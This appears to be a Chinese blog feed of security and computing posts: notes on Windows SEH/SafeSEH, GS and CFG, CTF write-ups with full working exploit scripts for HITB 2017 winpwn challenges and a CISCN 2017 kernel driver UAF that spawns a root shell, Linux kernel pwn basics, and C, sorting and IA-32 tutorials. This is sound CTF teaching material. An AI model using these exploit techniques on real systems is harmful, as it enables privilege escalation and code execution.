    <content type="text"><![CDATA[概览 SEH和SafeSEH是Windows的异常处理机制与其对应的安全策略. SEH SEH(Structured Exception Handling)是windows异常处理机制之一,是基于线程的异常处理,在程序源代码中使用__try,__except,__finally来实现SEH异常处理. 123456789__try&#123; guarded body of code&#125;__except(Condition)&#123; identifies an exception&#125;__finally&#123; identifies a termmination handle&#125; Windows下有多种异常处理:VEH,VCH,SEH,UEF.处理异常的优先级为:调试器,VEH,SEH,UEF,VCH. 常见的异常有:企图读写一个不可访问的地址;触发断点;企图执行一个无效的指令;除0;标志寄存器的TF位为1(单步调试); 当异常发生的时候程序会抛出异常,系统检测到异常就会进行异常处理,首先保存当前进程的基本信息,然后会去寻找异常句柄(Exception Handling)来处理异常.当前上下文的信息会被存储在一个叫做CONTEXT的结构体中,这些信息用于再完成异常处理后继续进程.异常的信息都被存储在一个叫做EXCEPTION_RECORD的结构体中. 123456void WINAPI RaiseException( _In_ DWORD dwExceptionCode,//表示当前线程的发生异常的原因(例如读写保护地址,数组越界并且能够被检查到等等). _In_ DWORD dwExceptionFlags,//表示当前的异常发生后,是否进行执行. _In_ DWORD nNumberOfArguments,//lpArguments数组中的参数个数 _In_ const ULONG_PTR *lpArguments); 1234typedef struct _EXCEPTION_POINTERS &#123; PEXCEPTION_RECORD ExceptionRecord;//指向ExceptionRecord的指针,里面记载了一个独立于机器的异常行为 PCONTEXT ContextRecord;//指向记录了异常上下文结构体的指针&#125; EXCEPTION_POINTERS, *PEXCEPTION_POINTERS; 123456789101112131415161718192021222324252627typedef struct _CONTEXT &#123; DWORD ContextFlags; DWORD Dr0; DWORD Dr1; DWORD Dr2; DWORD Dr3; DWORD Dr6; DWORD Dr7; FLOATING_SAVE_AREA FloatSave; DWORD SegGs; DWORD SegFs; DWORD SegEs; DWORD SegDs; DWORD Edi; DWORD Esi; DWORD Ebx; DWORD Edx; DWORD Ecx; DWORD Eax; DWORD Ebp; DWORD Eip; DWORD SegCs;//MUST BE SANITIZED DWORD EFlags;//MUST BE SANITIZED DWORD Esp; DWORD SegSs; BYTE ExtendedRegisters[MAXIMUM_SUPPORTED_EXTENSION];&#125; CONTEXT; 12345678typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode;//异常码:以STATUS_或EXCEPTION_开头,可自定义. DWORD ExceptionFlags;//异常标志:0可修复;1不可修复;2正在展开,不要试图修复. struct _EXCEPTION_RECORD *ExceptionRecord;//指向嵌套的异常结构,通常是异常中又引发异常. PVOID ExceptionAddress;//异常发生地址 DWORD NumberParameters;//下面ExceptionInformation所含有的dword数目 ULONG_PTR ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];//附加消息&#125; EXCEPTION_RECORD; SEH是由_EXCEPTION_REGISTRATION_RECORD结构体组成的链表,第一个异常处理中未处理相关异常,它就会被传递到下一个异常处理器,直到得到处理. 123456typedef struct _EXCEPTION_REGISTRATION_RECORD &#123; struct _EXCEPTION_REGISTRATION_RECORD *Next; //指向下一个节点的指针,直到遇到0xFFFFFFFF结束 PEXCEPTION_ROUTINE Handler; //异常处理函数指针&#125; 异常处理函数定义,是一个由系统调用的回调函数. 123456typedef _IRQL_requires_same_ _Function_class_(EXCEPTION_ROUTINE) EXCEPTION_DISPOSITION NTAPI EXCEPTION_ROUTINE ( _Inout_ struct _EXCEPTION_RECORD *ExceptionRecord, _In_ PVOID EstablisherFrame,//当前SEH栈的起始位置 _Inout_ struct _CONTEXT *ContextRecord, _In_ PVOID DispatcherContext); SEH链表是结构体NT_TIB的第一个结构体成员,结构体NT_TIB是TEB的第一个结构体成员,所以SEH链表指针位于FS:[0]的位置. SEH异常处理过程. 还可以扩展异常处理帧结构,也就是scope table域.其会在栈中保存一个GSCookie用于防御栈溢出,然后异常处理函数_except_handler4会调用HandlerFunc函数,这里是没有检测的. 12345678910111213struct _EH4_SCOPETABLE &#123; DWORD GSCookieOffset; DWORD GSCookieXOROffset; DWORD EHCookieOffset; DWORD EHCookieXOROffset; _EH4_SCOPETABLE_RECORD ScopeRecord[1];&#125;;struct _EH4_SCOPETABLE_RECORD &#123; DWORD EnclosingLevel; long (*FilterFunc)(); void (*HandlerFunc)();//处理函数&#125;; SEH安装. 123push @_except_handler ;异常处理器push dword ptr fs:[0] ;取出SEH链表头mov dword ptr fs:[0],esp ;添加链表 SEH卸载. 12pop dword ptr fs:[0] ;还原链表头add esp,4 ;删除异常处理器 绕过SafeSEH 攻击返回地址或者虚函数可以直接绕过SafeSEH,这里主要记录一下通过SEH和SafeSEH劫持控制流的方法. 利用未启用SafeSEH且不是纯IL的模块绕过SafeSEH. 将shellcode部署在堆中以绕过SafeSEH. DEP关闭时,可以利用加载模块之外的指令作为跳板. 存在scope table,可以劫持scope table中的两个函数指针.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Windows-基础]]></title>
    <url>%2Fposts%2Fc7ff3ba4%2F</url>
    <content type="text"><![CDATA[概览 Win和Linux上二进制漏洞利用的差别主要体现在不同的程序保护机制,堆管理机制和进程管理机制等上面. 函数调用 x86架构的微软操作系统使用stdcall:参数从右往左一次入栈,被调用者实现栈平衡,返回值存放在eax中. x86-64架构的微软操作系统的前四个整型参数使用rcx,rdx,r8,r9存储,使用xmm0到xmm3来放置浮点参数,其他的参数入栈(从右至左向8字节对齐). 同时x86-64中调用者有一个职责:在调用函数之前(无论实际的传参使用多大空间),在栈上的函数返回地址之上(靠近栈顶)分配一个32字节的影子空间,并且在调用结束后恢复.影子空间是给rcx,rdx,r8,r9保存值的,对于少于四个参数的函数也要分配影子空间. 进程管理机制 Windows通过TEB和PEB结构体管理进程. TEB &amp;&amp; PEB TEB(Thread Environment Block,线程环境块),一个进程的线程环境块中存放着该进程中所有线程的各种信息. ntdll.NtCurrentTeb()函数用来返回当前线程的TEB结构体指针,也就是FS:[0x18]的值,FS:[0]的值为SEH的起始地址. PEB(Process Envirorment Block,进程环境块),PEB是存放着进程信息的结构体. 线程TEB结构体中,每个TEB + 0x30(FS:[0x30])中都指向同一个地址,也就是该进程的PEB(TEB.ProcessEnvironmentBlock). 程序保护 使用winchecksec可检测保护机制(不一定正确). SafeSEH SafeSEH是为了防止通过覆盖堆栈上的异常处理函数句柄从而控制程序执行流程的攻击,基本原理即在调用异常处理函数之前对其进行一系列的有效性校验. SafeSEH需要OS和Compiler的双重支持. 通过启用/SafeSEH链接选项可使编译好的程序具备SafeSEH功能,该选项会将所有异常处理函数地址提取出来编入SEH表中,并将这张表放到程序的映像里用于检验. SafeSEH机制从RtlDispatchException()开始:如果异常处理链不在当前程序的栈中,则终止异常处理调用;如果异常处理函数的指针指向当前程序的栈中,则终止异常处理调用; 通过后调用RtlIsValidHandler()进行异常处理有效性检查.下面是Alex披露的RtlIsValidHandler()的伪代码. 1234567891011121314151617181920212223242526272829303132333435363738BOOL RtlIsValidHandler( handler ) &#123; if (handler is in the loaded image) &#123; //在加载模块的内存空间内 if (image has set the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) //程序设置了忽略异常处理 return FALSE; if (image has a SafeSEH table) //含有SafeSEH表说明程序启用了SafeSEH if (handler found in the table) //异常处理函数地址在表中 return TRUE; else return FALSE; if (image is a .NET assembly with the ILonly flag set) //包含IL标志的.NET中间语言程序 return FALSE; else return TRUE; &#125; if (handler is on non-executable page) &#123; //在不可执行页上 if (ExecuteDispatchEnable bit set in the process flags) //DEP关闭 return TRUE; else //访问违例异常 raise ACCESS_VIOLATION; &#125; if (handler is not in an image) &#123; //在可执行页上,但在加载模块之外 if (ImageDispatchEnable bit set in the process flags) //允许加载模块内存空间外执行 return TRUE; else return FALSE; &#125; return TRUE;&#125; RtlIsValidHandler()函数只有在以下三种情况下允许异常处理函数的执行. 异常处理函数指针位于加载模块内存范围外,并且可执行. 异常处理函数指针位于加载模块内存范围内,相应模块未启用SafeSEH且不是纯IL. 异常处理函数指针位于加载模块内存范围内,相应模块启用SafeSEH且函数地址在SEH表中. Win7及以上版本添加了对MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE的check,只有当其第六个比特为1时才可在加载模块内存范围外执行. Win10多了一个Check函数ntdll!RtlpIsValidExceptionChain,该函数会去获得当前SEH Chain的next域的值去和SEH表存放的值进行比较. GS GS保护机制是编译器在函数前后添加额外的处理代码,同时在程序开始时将由伪随机数生成的Cookie放入.data段.添加的代码前部分用于向栈中插入Cookie,它位于局部变量和返回地址之间.后部分在函数返回时调用security_check_cookie函数,以判断Cookie是否被更改过. win10在栈桢初始化完毕后用EBP异或Cookie,作为当前函数的Cookie,以此区别不同函数,在函数返回前,用EBP异或还原出Cookie种子. CFG 微软在Win10和Win8.1 Update 3中默认启用了一个新的机制,控制流保护(CFG). 为了完全实现CFG,编译器和操作系统都必须支持它.作为系统层面的利用缓解措施,CFG的实现需要联合编译器,操作系统用户层库和内核模块.Work-in-Progress Security Feature说明了使用CFG时开发者需要做的步骤. CFG机制主要集中在间接调用(调用的目标地址在运行时决定)的保护上. 启用CFG后,会在间接调用之前将目标地址传给_guard_check_icall函数,在其中实现CFG. 在没有CFG支持的Windows中,这个函数不做任何事.有CFG支持时它指向ntdll!LdrpValidateUserCallTarget函数.这个函数利用了一个结构检测目标地址的可靠性,也就是CFGBitmap,在进程空间中每8个字节对应CFGBitmap中的一位.如果这8字节中有函数的起始地址,则在CFGBitmap中对应的位设置为1,否则设置为0; ntdll!LdrpValidateUserCallTarget函数操作如下. 首先找到目标地址对应的CFGBitmap中的位,即将目标地址高3个字节作为该目标地址对应位所处元素(元素大小是4字节)在CFGBitmap的偏移,如果目标地址以0x10对齐,则第一个字节的第四位到第八位代表的数为其在单位内的位偏移值.如果目标地址不以0x10对齐,则位偏移值为前者与1或运算. 如果位等于1,意味着间接调用的目标是可靠的,函数将返回并继续执行间接调用.如果位等于0,意味着间接调用的目标是不可靠的,将触发异常阻止不可靠地址的运行. 检测CFG 使用dumpbin.exe /all file可以看到该程序关于CFG的支持信息(Load Config Table部分). Guard CF address of check-function pointer:就是_guard_check_icall函数的地址,有CFG支持时将被修改成nt!LdrpValidateUserCallTarget函数的地址. Guard CF function table:函数的相对虚拟地址(RVA)列表的指针,其包含了程序的代码.CFGBitmap的位信息来自Guard CF function table. Guard CF function count:函数RVA数量. CF Instrumented:表明程序中启用了CFG.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-hitb-gsec-2017-winpwn]]></title>
    <url>%2Fposts%2F748eb64e%2F</url>
    <content type="text"><![CDATA[babyshellcode 这里工具对SafeSEH检测出现了问题,实际上是开了的. name的输入存在溢出,后面printf存在泄露,这个溢出不能利用,因为无可利用的地址. Create shellcode对堆的申请使用的是VirtualAlloc,同时参数flprotect值为0x40,表示拥有RWE权限.Run shellcode中存在memcpy导致的栈溢出,触发的同时会修改堆内存的前四个字节为0xffffffff,然后调用触发异常处理. 由于MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE的check,直接修改SEH Handler为heap addr + 0x4是不行的.这里需要使用scmgr.dll,它是一个未开启SafeSEH的模块(使用OllySSEH插件查看)且自带system("cmd"). 现在问题就变成怎么获取其基址.(scmgr.dll每次进程重启的时候基址都不变)这里利用的是Set ShellcodeGuard中的加密算法,算法初始化的时候,加密的是scmgr!init_scmgr的地址.把这个算法dump出来正向爆破去算,如果结果等于最后加密的结果,说明这就是基址. 获取到基址之后,就能够构造SEH Handler指向scmgr!getshell_test(异常处理函数指针位于加载模块内存范围内,相应模块未启用SafeSEH且不是纯IL). Win10环境使用name处漏洞泄露SEH Chain的next域绕过check. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#coding=UTF-8from pwintools import *def get_scmgr_base(check): for base in range(0x60000000, 0x80000000, 0x10000): #0x8000000之上是内核空间 init_scmgr = base + 0x1090 g_table = [init_scmgr] for i in range(31): init_scmgr = (init_scmgr * 69069) &amp; 0xffffffff g_table.append(init_scmgr) g_index = 0 v0 = (g_index-1) &amp; 0x1f v2 = g_table[(g_index + 3) &amp; 0x1f] ^ g_table[g_index] ^ (g_table[(g_index + 3) &amp; 0x1f] &gt;&gt; 8) v1 = g_table[v0] v3 = g_table[(g_index + 10) &amp; 0x1F] v4 = g_table[(g_index - 8) &amp; 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) &amp; 0x1F])) &lt;&lt; 14) v4 = v4 &amp; 0xffffffff g_table[g_index] = v2 ^ v4 g_table[v0] = (v1 ^ v2 ^ v4 ^ ((v2 ^ (16 * (v1 ^ 4 * v4))) &lt;&lt; 7)) &amp; 0xffffffff g_index = (g_index - 1) &amp; 0x1F if(g_table[g_index] == check): print "base: " + hex(base) return base + 0x1100r = Process("babyshellcode.exe")r.recv(200)r.sendline("aaaa" * 20)seh_next = u32(r.recv(200)[86:90]) - 108print "seh_next: " + hex(seh_next)r.sendline("5")r.recv(200)r.sendline("1")check = r.recv(200).split("-")[5][:8]check = int(check, 16)print "check: " + hex(check)get_shell = get_scmgr_base(check)r.sendline("w4rd3n")r.recv(200)shellcode = "a" * 0x70shellcode += p32(seh_next) + p32(get_shell)r.sendline("1")r.recv(200)r.sendline(str(len(shellcode)))r.recv(200)r.sendline("1")r.recv(200)r.sendline("1")r.recv(200)r.sendline(shellcode)r.recv(200)r.sendline("4")r.recv(200)r.sendline("0")r.interactive() 纪念以下第一次复现winpwn. babystack 这里工具对SafeSEH检测出现了问题,实际上是开了的. 开局给了栈地址和main函数地址.程序中还有个隐藏的system("cmd"). 由于程序退出使用的是exit(0),所以劫持eip失效. 这里的思路还是通过SEH异常处理,由于没有合适的条件直接绕过SafeSEH劫持SEH Handler(这里会与SEH表比对),这里需要伪造scope table. 在主函数中scope table域指针被加密并放入了栈中. _except_handler4异常处理函数会调用VCRUNTIME140!_except_handler4_common,逆向其逻辑,其最后会调用HandlerFunc. 由于要覆盖scope table域指针同时维护SEH链所以要泄露SEH的next和handler,又因为是加密的所以还要泄露___security_cookie. VCRUNTIME140!_except_handler4_common中还对ebp - 0x1C处进行了检测,这个值是ebp异或___security_cookie,也需要fix. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding=UTF-8from pwintools import *r = Process("babystack.exe")r.recvline()stack = int(r.recvline().split("0x")[1], 16)main = int(r.recvline().split("0x")[1], 16)print "stack: " + hex(stack)print "main: " + hex(main)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 140))seh_next = int(r.recvline().split("0x")[2], 16) print "seh_next: " + hex(seh_next)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 144))seh_handle = int(r.recvline().split("0x")[2], 16) print "seh_handle: " + hex(seh_handle)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(main + 12116))security_cookie = int(r.recvline().split("0x")[2], 16) print "security_cookie: " + hex(security_cookie)fake_scope_table = security_cookie ^ (stack + 0x64)print "fake_scope_table: " + hex(fake_scope_table)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(stack + 128))check = int(r.recvline().split("0x")[2], 16) print "check: " + hex(check)r.recvline()r.sendline("go")payload = ""payload += "a" * 0x64payload += "\xe4\xff\xff\xff" + p32(0) + "\x20\xff\xff\xff" + p32(0)payload += "\xfe\xff\xff\xff" + p32(main + 664) + p32(main + 733)payload += p32(check) + "a" * 8 + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table)r.sendline(payload)r.recvline()r.sendline("yes")r.recvline()r.sendline(str(0))r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2017-babydriver]]></title>
    <url>%2Fposts%2F5b72592c%2F</url>
    <content type="text"><![CDATA[分析 解包分析init,发现只是加载驱动等正常套路.分析驱动发现由于存放指针的变量是全局变量,存在一个伪条件竞争引发的UAF漏洞. 利用思路 打开两次设备,通过ioctl更改其大小为cred结构体的大小,释放其中一个,fork一个新进程,那么这个新进程的cred的空间就会和之前释放的空间重叠,此时就可以通过另一个文件描述符对cred空间写. 需要确定cred结构体的大小,计算一下是0xa8(注意使用相同内核版本的源码). 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stropts.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;int main() &#123; int fd1 = open("/dev/babydev", 2); int fd2 = open("/dev/babydev", 2); ioctl(fd1, 0x10001, 0xa8); close(fd1); int pid = fork(); if (pid &lt; 0) &#123; exit(0); &#125; else if (pid == 0) &#123; char zeros[30] = &#123;0&#125;; write(fd2, zeros, 28); if (getuid() == 0) &#123; system("/bin/sh"); &#125; &#125; else &#123; wait(NULL); &#125; close(fd2); return 0;&#125; 1gcc exp.c -static -o exp]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-kernel-基础]]></title>
    <url>%2Fposts%2F571022a5%2F</url>
    <content type="text"><![CDATA[概览 kernel是一个软件,用于管理其他所有软件发出的数据I/O要求并将这其转义为指令交给CPU和计算机中的其他组件处理,并进行权限控制,系统调用,进程管理,内存管理等多项功能,kernel是现代操作系统最基本的部分.Intel CPU将CPU的特权级别分为4个级别:Ring 0 ~ 3.Ring 0只给OS使用,Ring 3所有程序都可以使用,内层Ring可以随便使用外层Ring的资源. 大多数的现代操作系统只使用了Ring 0和Ring 3.且在Linux等现代操作系统中,虚拟内存地址通常被划分为内核空间和用户空间.内核地址空间由所有进程共享,但只有运行在内核态的进程才能访问,用户进程可以通过系统调用切换到内核态访问内核空间. linux内核源码:https://github.com/torvalds/linux.linux内核源码在线查看:https://elixir.bootlin.com/linux/latest/source. linux内核内存分布图:https://elixir.bootlin.com/linux/v5.0/source/Documentation/x86/x86_64/mm.txt. LKM 可加载核心模块(LKM)就是运行在内核空间的可执行程序,包括:驱动程序(如设备驱动,文件系统驱动),内核扩展模块(modules)等. LKM的文件格式和用户态的可执行程序相同,后缀常常是ko,因此可以直接用IDA等工具来分析.模块不能单独运行(就像一个动态链接库),它在运行时被链接到内核作为内核的一部分在内核空间运行. 12345678modinfo test.ko#获得模块信息insmod test.ko#加载内核模块,需要root权限lsmod#列出已加载的内核模块rmmod test.ko#卸载内核模块,需要root权限 ioctl是一种系统调用,用于与设备通信.设备驱动的代码允许在内核空间运行而且可以对设备直接寻址,通过ioctl用户空间可以跟设备驱动沟通从而与设备通信. 123int ioctl(int fd, unsigned long request, ...)//fd:打开设备时返回的文件描述符//第二个参数为用户程序对设备的控制命令,再后边的参数则是控制命令函数的参数 内核模块程序的结构中包括一些callback回调表,对应的函数存在一个file_operations结构体中,结构体中实现了的回调函数就会初始化为对应函数地址,而未实现为NULL. 状态切换 当发生系统调用,异常,外设产生中断等事件时,会发生用户态到内核态的切换. 具体的过程为. 通过swapgs切换GS段寄存器,将GS寄存器值和一个特定位置的值进行交换,保存用户态GS值同时设置内核GS值; 将当前栈顶(用户空间栈顶)保存到CPU独占变量区域里,将CPU独占区域里记录的内核栈顶放入rsp/esp; 通过push保存用户态上下文; 通过汇编指令判断是否为x32_abi; 最后通过系统调用号跳到全局变量sys_call_table相应位置继续执行系统调用. 从内核态退出到用户态时流程为:通过swapgs命令恢复GS(随后还会pop ebp);通过sysretq或者iretq恢复到用户控件继续执行.使用iretq还需要给出用户空间的一些信息(CS,eflags/rflags,esp/rsp等). 内核态函数 内核态函数与户态库函数不同,这里列举一些. printf() -&gt; printk(),printk()不一定会把内容显示到终端上,但一定在内核缓冲区里,可以通过dmesg查看. memcpy() -&gt; copy_from_user()/copy_to_user():用户空间和内核空间之间数据交流,还有拷贝简单类型数据的put_user/get_user. malloc() -&gt; kmalloc(),kmalloc()使用的是slab/slub分配器. free() -&gt; kfree(),同kmalloc(). kptr_restrict/dmesg_restrict 内核提供控制变量/proc/sys/kernel/kptr_restrict用于控制内核的一些输出打印. kptr_restrict == 2:内核将符号地址打印为全0,root和普通用户都没有权限. kptr_restrict == 1:root用户有权限读取,普通用户没有权限. kptr_restrict == 0:root和普通用户都可以读取. 同样的,设置/proc/sys/kernel/dmesg_restrict为1禁止普通用户查看demsg信息. 内核符号表 kallsyms抽取了内核用到的所有函数地址(全局的,静态的)和非栈数据变量地址,生成一个数据块,作为只读数据链接进kernel image,相当于内核中存了一个System.map. 要在一个内核中启用kallsyms功能,须设置CONFIG_KALLSYMS选项为y,如果要在kallsyms中包含全部符号信息,须设置CONFIG_KALLSYMS_ALL为y. kallsyms表位于/proc/kallsyms,kernel中的mod_tree处存放着各个加载模块的地址. 1234sudo sysctl -w kernel.kptr_restrict=0grep mod_tree /proc/kallsymscat /proc/kallsymscat System.map 系统slab信息 1cat /proc/slabinfo 内核态保护 除了拥有用户态的保护手段,内核态还有特有的保护方式. KPTI(Kernel PageTable Isolation):进程地址空间被分成了内核地址空间和用户地址空间,其中内核地址空间映射到了整个物理地址空间,而用户地址空间只能映射到指定的物理地址空间.内核地址空间和用户地址空间共用一个页全局目录表,为了彻底防止用户程序获取内核数据,可以令内核地址空间和用户地址空间使用两组页表集.Windows上把这个叫KVA Shadow. SMEP(Supervisor Mode Execution Protection):当处理器处于Ring 0模式,执行用户空间的代码会触发页错误(在ARM中该保护称为PXN). SMAP(Superivisor Mode Access Protection):类似于smep,访问户空间的数据会触发页错误. KASLR:地址随机化. Stack Protector:关于函数返回地址的检测,属于CFI(Control Flow Integrity,控制流完整性保护)中的后向控制流完整性保护. CR4寄存器用于存储内核的标志位. 上传二进制文件 123exp_base = system("base64 exp")r. sendline("echo " + exp_base + " &gt; exp.txt")r. sendline("base64 -d exp.txt &gt; exp")]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux-kernel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-develop-C-基础]]></title>
    <url>%2Fposts%2F18b90a20%2F</url>
    <content type="text"><![CDATA[环境 C语言源代码并不能直接运行,而是需要一个编译环境将其从源代码编译成可执行程序,然后再在编译环境对应运行环境中运行. C语言的编译过程可以划分为:预处理,gcc编译器编译(C语言到汇编代码),汇编器汇编(汇编代码到机器代码),链接(目标文件到可执行文件). 词法 C语言作为一门计算机语言,和大部分语言结构是类似的.由空格(或TAB,换行)分隔一个个标记(token,就像英语中的单词),由;划分一个个语句(#预处理以换行分隔)).其支持的字符至少包括所有大小写字母,数字和其他字符(貌似正常键盘的字符都行).标准还定义了三字母词用于某些缺失必需字符的环境.同时还有字符串中的转义字符. C语言支持以/*开始,*/结束的注释.也支持以//注释本行中//后面的所有字符(不写注释的程序员都不是一个好的Web手). 标识符是变量,函数,类型等的名字,由大小写字母,数字和下划线组成,但不能以数字开头(虽然对长度没限制,但标准允许编译器忽略第31个字符以后的字符). C语言关键字不能作为标识符,如auto,if,int等. 数据 C语言中仅有4种基本数据类型:整型,浮点型,指针和聚合类型.所有其他类型都是由基本类型的某种组合派生而来. 整型 整型包括char,short,int,long,long long,并且都有对应的有符号和无符号版本. char大小为1字节,后三者在标准中是这样规定的:长整型至少和整型一样长,整型至少和短整型一样长.对应类型能表示的具体范围看对应版本源码的limits.h头文件. 字面值其实就是指在程序中直接出现的值,例如:a = 3;中3就是一个整型字面值. 枚举类型实际上也是整型类型,且枚举类型的变量以整型存储. 浮点型 浮点型包括float,double,long double,分别提供单精度,双精度以及某些支持扩展精度的机器上的扩展精度. 对应类型能表示的具体范围看对应版本源码的float.h头文件. 指针 每一个变量相当于对一块对应大小的存储空间的应用,将内存的位置关系叫做地址,指针就是地址. 实际上指针也是以整数形式存储,且大小始终未当前操作系统的字长(因为其要能完整表示整个内存地址空间). tips 在C语言中,字符串就是一串以NUL字节结尾的字符数组,NUL作为字符串终止符,不被看做字符串的一部分,且一个字符串常量在表达式中实际上是以指针的形式存在. 声明 变量声明的基本形式:说明符(一个或多个) 声明表达式列表. 说明符用于说明要声明的变量类型,声明表达式列表一般为变量的标识符和初始化语句. 例如:int a;,unsigned long long a, b = 2;. typedef C语言支持使用typedef为各种数据类型定义新名字.例如:typedef char * char_ptr;. const 使用了const限定符的变量被称为常量变量,其与普通变量的区别在于常量变量必须初始化,且初始化后不能再改变(作为形参的常量变量可以获得实参的值). 当对指针变量使用const时又有一点区别.int * const p,表示指针p是常量变量,不能对p赋值.int const * p,表示p指向的变量为常量变量. 其实const的限制只体现在编译器层面,汇编层面常量变量和普通变量是一样的. 作用域]]></content>
      <categories>
        <category>CS</category>
        <category>develop</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-algorithm-排序算法]]></title>
    <url>%2Fposts%2F8661c647%2F</url>
    <content type="text"><![CDATA[概念 排序算法是一个经典的算法问题模型,对于一个元素数组,根据其主键(如整数数组的数值)的全序关系(如数值的大小关系)进行排序. 123456789101112131415161718192021222324252627282930//排序算法模板类public class Example &#123; public static void sort(Comparable[] a) &#123; /* code */ &#125; private static boolean less(Comparable v, Comparable w) &#123; return v.compareTo(w) &lt; 0; &#125; private static void swap(Comparable[] a, int i, int j) &#123; Comparable t = a[i]; a[i] = a[j]; a[j] = t; &#125; private static void show(Comparable[] a) &#123; for (int i = 0;i &lt; a.length;i++) &#123; StdOut.print(a[i] + " "); &#125; StdOut.println(); &#125; public static boolean isSorted(Comparable[] a) &#123; for (int i = 1;i &lt; a.length;i++) &#123; if (less(a[i], a[i - 1])) &#123; return false; &#125; return true; &#125; &#125; public static void main(String[] args) &#123; String[] a = In.readStrings(); sort(a); assert isSorted(a); show(a); &#125;&#125; 选择排序 核心思想:取出数组元素中的最值,依次放入另一个数组,另一个数组将被维护成一个被排序的数组. 其运行时间与输入无关.数据移动次数是最少的. 1234567891011121314public class Selection &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 0;i &lt; N;i++) &#123; int min = i; for (int j = i + 1;j &lt; N;j++) &#123; if (less(a[j], a[min])) &#123; min = j; &#125; &#125; swap(a, i, min); &#125; &#125;&#125; 插入排序 核心思想:将每一个元素插入到有序的元素数组中的正确位置,同时将其于元素移动(数组大小增加). 其运行时间和数据移动次数与输入有关.对于倒置数量越小的数组此算法效率越高. 12345678910public class Insertion &#123; public static void sort(Comparable[] a) &#123; int N = a.length; for (int i = 1;i &lt; N;i++) &#123; for (int j = i;j &gt; 0 &amp;&amp; less(a[j], a[j - 1]);j--) &#123; swap(a, j, j - 1); &#125; &#125; &#125;&#125; 希尔排序 核心思想:基于插入排序,首先保证数组任意间隔为x的元素是有序的,从而使移动次数减少,n逐渐递减为1(即插入排序). 123456789101112131415public class Shell &#123; public static void sort(Comparable[] a) &#123; int N = a.length; int x = 1; while (x &lt; N / 3) x = x * 3 + 1; while (x &gt;= 1) &#123; for (int i = x;i &lt; N;i++) &#123; for (int j = i;j &gt;= x &amp;&amp; less(a[j], a[j - x]);j -= x) &#123; swap(a, j, j - x); &#125; &#125; x = x / 3; &#125; &#125;&#125; 归并排序 核心思想:对于两个有序数组,利用偏序关系的传递性减少数据的移动和大小比较. 1234567891011121314151617181920212223242526272829public class Merge &#123; private static Comparable[] aux; public static void sort(Comparable[] a) &#123; aux = new Comparable[a.length]; sort(a, 0, a.length - 1); &#125; private static void sort(Comparable[] a, int l, int r) &#123; if (r &lt;= l) return; int mid = l + (r - l) / 2; sort(a, l, mid); sort(a, mid + 1, r); merge(a, l, mid, r); &#125; public static void merge(Comparable[] a, int l, int mid, int r) &#123; int i = l, j = mid + 1; for (int k = l;k &lt;= r;k++) &#123; aux[k] = a[k]; &#125; for (int k = l;k &lt;= r;k++) &#123; if (i &gt; mid) a[k] = aux[j++]; else if (j &gt; r) a[k] = aux[i++]; else if (less(aux[j], aux[i])) a[k] = aux[j++]; else a[k] = aux[i++]; &#125; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>BASIC</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-BASIC-assembly-IA32-基础]]></title>
    <url>%2Fposts%2F80651f79%2F</url>
    <content type="text"><![CDATA[简介 汇编语言与机器语言之间是一一对应的,不同的CPU支持的ISA也是不一样的,一种CPU能执行的全局机器指令集合就是该CPU的指令集. IA-32是Intel研发的一种CPU架构.包括Intel 80386/80486,Intel Pentium,Intel Xeon,Intel Core. IA-32支持8/16/32位的操作数,同时支持16/32位的存储器寻址方式,使用小端法存储数据(高位高地址,低位低地址). 工作方式 IA-32系列CPU有三种工作方式:保护方式,实地址方式和系统管理方式; 保护方式有一种子工作方式,虚拟8086方式. 为了兼容,IA-32系列CPU支持两种段模式,32位段模式和16位段模式.32位段模式默认操作数尺寸为8/32位,默认存储器寻址方式为32位,16位段模式默认操作数尺寸为8/16位,默认存储器寻址方式为16位. 保护方式下一般采用32位段模式,实方式下只能使用16位段模式. 保护方式 保护方式是IA-32系列CPU的常态工作方式. 在保护方式下,全部32根地址线有效,可寻址2 ^ 32 BYTE(4GB)的物理地址空间;支持扩充的存储器分段管理和可选的存储器分页管理基址,为实现虚拟内存空间提供了硬件支持; 支持4个特权级,实施特权检查. 保护方式下还支持虚拟8086方式(保护方式运行的多任务可以是不同的运行方式),可以在多任务环境下运行基于Intel 8086/8088处理器的程序. 实地址方式 